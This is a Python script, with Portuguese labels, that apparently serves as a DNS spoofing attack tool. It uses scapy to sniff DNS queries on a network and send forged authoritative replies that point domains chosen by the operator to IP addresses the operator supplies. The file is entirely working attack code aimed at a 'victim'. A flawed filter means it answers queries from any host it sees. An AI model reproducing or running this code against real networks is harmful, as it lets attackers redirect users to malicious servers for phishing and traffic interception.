import os
import socket
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import sniff, send

colors = {'RED': "\033[91m",
          'ORANGE' : '\033[0;38;5;214m',
          'BLUE' : '\033[0;38;5;12m',
          'ENDC': "\033[0m"}


def lista_de_alvos():
    URl = input(colors['RED'] + "[+]" + colors['ORANGE'] + " Introduza a(s) URL(s) a spoofar (separadas por um espaço): "+ colors['ENDC'])
    URl = URl.split()
    for x in URl:
        ip_address = input(colors['RED'] + "[+]" + colors['ORANGE'] + " Introduza o IP p/ Falsificação da URL " + colors['RED'] + f"{x}: " + colors['ENDC'])
        dns_hosts[x] = ip_address
    print(colors['RED'] + "[*]" + colors['ORANGE'] + "Spoofing URLs ==>" + colors['ENDC'] + f"{dns_hosts}")
    return dns_hosts

def valida_ip(endereco):
    try:
        socket.inet_aton(endereco)
        return True
    except:
        return False


def verifica_ip_local():
    local_ip = os.popen("ip route | grep 'src' | awk {'print $9'}").read().strip()
    while True:
        if (valida_ip(local_ip)):
            break
        else:
            local_ip = input(colors['RED'] + "    [!] Nao foi possivel obter o proprio IP. Escreve-o: " + colors[
                'ENDC']).strip()
    return local_ip


local_ip = verifica_ip_local()

ip_vitima = ''
dns_hosts = {}
sniff_filter = 'udp dst port 53'

def verifica_ip_vitima(pkt):
    if (IP in pkt):
        result = True
    elif (IP in pkt):
        result = (pkt[IP].src == ip_vitima)
    else:
        result = False
    return result


# Verifica se a query DNS é válida e envia a resposta forjada
def forja_resposta_dns(pkt):
    ip_vitima = verifica_ip_vitima(pkt)
    if (ip_vitima and pkt[IP].src != local_ip and UDP in pkt and DNS in pkt and pkt[DNS].opcode == 0 and pkt[
        DNS].ancount == 0 and str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname)) - 2] in dns_hosts):
        dominio_a_spoofar = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname)) - 2]


        # campos base
        destination_ip = pkt[IP].src
        source_ip = pkt[IP].dst
        destination_port = pkt[UDP].sport
        source_port = 53
        dns_id = pkt[DNS].id
        query = pkt[DNS].qd
        query_name = pkt[DNSQR].qname
        response_data = dns_hosts[dominio_a_spoofar]
        valor_ttl = 300

        # Construção da resposta forjada
        resposta_forjada = IP(dst=destination_ip, src=source_ip) / \
                           UDP(dport=destination_port, sport=source_port) / \
                           DNS(id=dns_id,
                               qd=query,
                               aa=1,
                               qr=1,
                               ancount=1,
                               an=DNSRR(rrname=query_name, rdata=response_data, ttl=valor_ttl))
        send(resposta_forjada, verbose=0)

        print(colors['ORANGE'] + "[*]" + colors['BLUE'] + " Foi enviada resposta forjada a " + colors['ENDC'] + "[" + pkt[IP].src + "]" + colors[
            'ORANGE'] + ". A URL " + colors['ENDC'] + "[" + dominio_a_spoofar + "]" + colors['ORANGE'] + " foi redirecionada para " +
              colors['ENDC'] + "[" + dns_hosts[dominio_a_spoofar] + "]")


def dns_spoof(hosts, vitima):
    global ip_vitima
    global dns_hosts
    ip_vitima = vitima
    dns_hosts = hosts
    print(colors['RED'] + "[i] A spoofar respostas de DNS...")
    sniff(prn=forja_resposta_dns, filter=sniff_filter, store=0)



